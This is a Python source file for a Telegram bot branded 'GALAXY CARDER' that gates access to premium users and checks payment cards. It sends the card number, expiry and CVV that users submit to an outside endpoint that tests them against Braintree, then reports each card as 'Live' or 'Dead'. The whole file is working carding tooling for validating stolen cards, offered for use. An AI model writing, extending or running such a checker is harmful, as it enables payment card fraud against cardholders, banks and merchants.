import requests
import time
import os

# Path to id.txt file
ID_FILE = "id.txt"

def is_premium_user(user_id):
    """Checks if the user is in id.txt and if their premium access is still valid."""
    try:
        if not os.path.exists(ID_FILE):
            return False  # If the file does not exist, no users have access

        with open(ID_FILE, "r") as file:
            valid_users = []
            for line in file:
                parts = line.strip().split(":")  # Use ":" as separator
                if len(parts) == 2:
                    stored_id, expiry = parts
                    if str(user_id) == stored_id:
                        if time.time() < float(expiry):  # Check if expiry is valid
                            return True  # User has premium access
                    else:
                        valid_users.append(line)  # Keep valid users

        # Remove expired users
        with open(ID_FILE, "w") as file:
            file.writelines(valid_users)

    except Exception as e:
        print(f"Error checking premium user: {e}")

    return False  # Default to False if any error occurs

def format_b3_response(api_response, time_taken):
    """Formats the API response into a structured message with time taken."""
    lines = api_response.split("\n")
    data = {}

    for line in lines:
        if "𝗖𝗔𝗥𝗗 ➺" in line:
            data["card"] = line.split("➺")[-1].strip()
        elif "𝗘𝗫𝗣𝗜𝗥𝗬 ➺" in line:
            data["expiry"] = line.split("➺")[-1].strip()
        elif "𝗖𝗩𝗩 ➺" in line:
            data["cvv"] = line.split("➺")[-1].strip()
        elif "𝗕𝗔𝗡𝗞 𝗡𝗔𝗠𝗘 ➺" in line:
            data["bank"] = line.split("➺")[-1].strip()
        elif "𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ➺" in line:
            data["response"] = line.split("➺")[-1].strip()
        elif "𝗦𝗧𝗔𝗧𝗨𝗦 ➺" in line:
            status_text = line.split("➺")[-1].strip()
            data["status"] = "❌ Dead" if "Dead" in status_text else "✅ Live" if "Live" in status_text else "⚠️ Unknown"

    formatted_message = f"""
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
<b>🔥 𝐁𝐑𝐀𝐈𝐍𝐓𝐑𝐄𝐄 𝐀𝐔𝐓𝐇 🔥</b>
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
<b>💳 𝑪𝒂𝒓𝒅:</b> <code>{data.get("card", "N/A")}</code>  
<b>📆 𝑬𝒙𝒑𝒊𝒓𝒚:</b> <code>{data.get("expiry", "N/A")}</code>  
<b>🔑 𝑪𝑽𝑽:</b> <code>{data.get("cvv", "N/A")}</code>  
<b>🏦 𝑩𝒂𝒏𝒌:</b> <b><u>{data.get("bank", "N/A")}</u></b>  
<b>📌 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆:</b> <b><i>{data.get("response", "N/A")}</i></b>  
<b>⚡ 𝑺𝒕𝒂𝒕𝒖𝒔:</b> <b><i>{data.get("status", "N/A")}</i></b>  
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
<b>⏱ Time Taken:</b> <code>{time_taken:.2f} sec</code>  
<b>👑 𝘽𝙊𝙏 𝘽𝙔:</b> <code>GALAXY CARDER 🥷</code>
<pre>━━━━━━━━━━━━━━━━━━━━━━━━━━━</pre>
"""
    return formatted_message

def send_progress_message(bot, chat_id):
    """Sends a processing message with a loading animation."""
    progress_messages = [
        "<b>🔄 Processing Card...</b>",
        "<b>🔄 Checking Details...</b>",
        "<b>🔄 Verifying with Braintree...</b>",
        "<b>🔄 Almost Done...</b>",
    ]
    progress_msg = bot.send_message(chat_id, progress_messages[0], parse_mode="HTML")
    
    for i in range(1, len(progress_messages)):
        time.sleep(2)  # Simulate processing time
        bot.edit_message_text(progress_messages[i], chat_id, progress_msg.message_id, parse_mode="HTML")
    
    return progress_msg

def check_braintree(bot, message, card_details):
    """Checks if the user has premium access, shows processing animation, and then fetches the result."""
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_premium_user(user_id):
        bot.send_message(chat_id, "<b>🚫 Access Denied:</b> You are not a premium user or your access has expired.", parse_mode="HTML")
        return

    progress_msg = send_progress_message(bot, chat_id)  # Show processing animation

    start_time = time.time()
    url = f"https://darkboy-b3.onrender.com/key=dark/cc={card_details}"
    response = requests.get(url)

    if response.status_code == 200:
        formatted_response = format_b3_response(response.text, time.time() - start_time)
    else:
        formatted_response = "<b>❌ Error:</b> Unable to process request."

    bot.edit_message_text(formatted_response, chat_id, progress_msg.message_id, parse_mode="HTML")
